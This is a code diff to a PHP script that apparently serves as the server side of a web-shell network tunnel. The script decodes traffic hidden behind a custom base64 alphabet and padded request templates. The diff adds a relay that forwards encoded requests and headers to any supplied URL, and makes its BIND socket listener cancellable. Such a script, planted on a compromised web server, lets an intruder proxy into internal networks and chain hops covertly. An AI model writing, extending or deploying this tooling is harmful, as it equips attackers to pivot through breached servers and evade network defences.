@@ -860,6 +860,109 @@ function roger_mode_setting($value, $default) {
     return ($value === "classic" || $value === "half" || $value === "full") ? $value : $default;
 }
 
+function roger_redirect_mode_allowed($info) {
+    global $MODEOPT;
+    if (!isset($info[$MODEOPT]) || $info[$MODEOPT] === "") {
+        return true;
+    }
+    return strtolower(trim($info[$MODEOPT])) === "classic";
+}
+
+function roger_send_classic_info($info, $en, $de) {
+    echo strtr(base64_encode(blv_encode($info, "optimal", 1024)), $en, $de);
+}
+
+function roger_relay_classic_request($info, $requestDataHead, $requestDataTail, $en, $de) {
+    global $REDIRECTURL, $FORCEREDIRECT, $STATUS, $ERROR;
+
+    if (!roger_redirect_mode_allowed($info)) {
+        roger_send_classic_info(array(
+            $STATUS => "FAIL",
+            $ERROR => "Redirection is supported in classic mode only",
+        ), $en, $de);
+        return true;
+    }
+
+    $redirectUrl = $info[$REDIRECTURL];
+    if (!is_string($redirectUrl) || filter_var($redirectUrl, FILTER_VALIDATE_URL) === false) {
+        roger_send_classic_info(array(
+            $STATUS => "FAIL",
+            $ERROR => "Invalid redirect URL",
+        ), $en, $de);
+        return true;
+    }
+    $scheme = strtolower((string)parse_url($redirectUrl, PHP_URL_SCHEME));
+    if ($scheme !== "http" && $scheme !== "https") {
+        roger_send_classic_info(array(
+            $STATUS => "FAIL",
+            $ERROR => "Redirect URL must use HTTP or HTTPS",
+        ), $en, $de);
+        return true;
+    }
+
+    $forceRedirect = isset($info[$FORCEREDIRECT]) && strtoupper($info[$FORCEREDIRECT]) === "TRUE";
+    $redirectHost = (string)parse_url($redirectUrl, PHP_URL_HOST);
+    $redirectIp = gethostbyname($redirectHost);
+    $serverIp = isset($_SERVER["SERVER_ADDR"]) ? $_SERVER["SERVER_ADDR"] : "";
+    if (!$forceRedirect && ($redirectHost === "localhost" || $redirectIp === "127.0.0.1" || ($serverIp !== "" && $redirectIp === $serverIp))) {
+        return false;
+    }
+
+    unset($info[$REDIRECTURL]);
+    unset($info[$FORCEREDIRECT]);
+    $encoded = strtr(base64_encode(blv_encode($info, "optimal", 1024)), $en, $de);
+    $body = $requestDataHead . $encoded . $requestDataTail;
+
+    $headers = array();
+    if (function_exists("getallheaders")) {
+        $incomingHeaders = getallheaders();
+        foreach ($incomingHeaders as $name => $value) {
+            $lower = strtolower($name);
+            if (in_array($lower, array("connection", "content-length", "host", "keep-alive", "proxy-connection", "te", "trailer", "transfer-encoding", "upgrade"), true)) {
+                continue;
+            }
+            $headers[] = $name . ": " . $value;
+        }
+    }
+    $headers[] = "Content-Length: " . strlen($body);
+
+    $context = stream_context_create(array(
+        "http" => array(
+            "method" => isset($_SERVER["REQUEST_METHOD"]) ? $_SERVER["REQUEST_METHOD"] : "POST",
+            "header" => implode("\r\n", $headers),
+            "content" => $body,
+            "ignore_errors" => true,
+            "follow_location" => 0,
+            "timeout" => 30,
+        ),
+    ));
+    $responseBody = @file_get_contents($redirectUrl, false, $context);
+    if ($responseBody === false) {
+        $lastError = error_get_last();
+        $message = is_array($lastError) && isset($lastError["message"]) ? $lastError["message"] : "Redirect request failed";
+        roger_send_classic_info(array($STATUS => "FAIL", $ERROR => $message), $en, $de);
+        return true;
+    }
+
+    if (isset($http_response_header) && is_array($http_response_header)) {
+        foreach ($http_response_header as $index => $headerLine) {
+            if ($index === 0) {
+                if (preg_match('/\s([0-9]{3})\s/', $headerLine, $matches)) {
+                    http_response_code((int)$matches[1]);
+                }
+                continue;
+            }
+            $name = strtolower(trim(strtok($headerLine, ':')));
+            if (in_array($name, array("connection", "content-length", "keep-alive", "proxy-connection", "te", "trailer", "transfer-encoding", "upgrade"), true)) {
+                continue;
+            }
+            header($headerLine, false);
+        }
+    }
+    echo $responseBody;
+    return true;
+}
+
 function roger_settings_file($settingsKey) {
     return roger_state_file($settingsKey, "settings");
 }
@@ -941,15 +1044,31 @@ $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 $de = "BASE64 CHARSLIST";
 
 $post_data = file_get_contents("php://input");
+$requestDataHead = "";
+$requestDataTail = "";
 if (USE_REQUEST_TEMPLATE == 1) {
+    if (strlen($post_data) < START_INDEX + END_INDEX) {
+        http_response_code(400);
+        exit;
+    }
+    $requestDataHead = substr($post_data, 0, START_INDEX);
+    $requestDataTail = END_INDEX > 0 ? substr($post_data, -END_INDEX) : "";
     $post_data = substr($post_data, START_INDEX);
-    $post_data = substr($post_data, 0, -END_INDEX);
+    if (END_INDEX > 0) {
+        $post_data = substr($post_data, 0, -END_INDEX);
+    }
 }
 $info = blv_decode(base64_decode(strtr($post_data, $de, $en)));
 $rinfo = array();
 $sayhello = false;
 $streamingResponse = false;
 $responseSettings = roger_settings_from_info($info);
+
+if (isset($info[$REDIRECTURL]) && $info[$REDIRECTURL] !== "") {
+    if (roger_relay_classic_request($info, $requestDataHead, $requestDataTail, $en, $de)) {
+        exit;
+    }
+}
 
 $mark = $info[$MARK];
 $cmd = $info[$CMD];
@@ -1148,20 +1267,49 @@ switch($cmd){
             roger_file_clear($readfile);
             roger_file_clear($eoffile);
             roger_file_clear($tcpwritefile);
-            roger_lock_release($stateLock);
-
-            $client_socket = stream_socket_accept($server_socket, -1);
-            stream_set_blocking($client_socket, false);
-            $client_ip = stream_socket_get_name($client_socket, true);
-
-            $stateLock = roger_lock_acquire($lockfile);
             roger_file_put_bool_unlocked($runfile, true);
             roger_file_put_unlocked($commandfile, "BIND");
-            roger_file_put_unlocked($peerfile, $client_ip);
+            roger_file_put_unlocked($peerfile, "");
             roger_file_put_bool_unlocked($shutdownfile, false);
             roger_file_put_bool_unlocked($shutdownackfile, false);
             roger_file_put_bool_unlocked($remoteeoffile, false);
             roger_file_put_bool_unlocked($remoteeofsentfile, false);
+            roger_control_save_unlocked($controlfile, true, "BIND", "", false, false, $sessionHalfClose);
+            roger_lock_release($stateLock);
+
+            $client_socket = false;
+            while (true) {
+                $stateLock = roger_lock_acquire($lockfile);
+                $running = roger_file_bool_unlocked($runfile);
+                roger_lock_release($stateLock);
+                if (!$running) {
+                    break;
+                }
+                $client_socket = @stream_socket_accept($server_socket, 1);
+                if ($client_socket !== false) {
+                    break;
+                }
+            }
+            if ($client_socket === false) {
+                fclose($server_socket);
+                $rinfo[$STATUS] = 'FAIL';
+                $rinfo[$ERROR] = "BIND listener cancelled";
+                break;
+            }
+            stream_set_blocking($client_socket, false);
+            $client_ip = stream_socket_get_name($client_socket, true);
+
+            $stateLock = roger_lock_acquire($lockfile);
+            $running = roger_file_bool_unlocked($runfile);
+            if (!$running) {
+                roger_lock_release($stateLock);
+                fclose($client_socket);
+                fclose($server_socket);
+                $rinfo[$STATUS] = 'FAIL';
+                $rinfo[$ERROR] = "BIND listener cancelled";
+                break;
+            }
+            roger_file_put_unlocked($peerfile, $client_ip);
             roger_control_save_unlocked($controlfile, true, "BIND", $client_ip, false, false, $sessionHalfClose);
             roger_lock_release($stateLock);
 
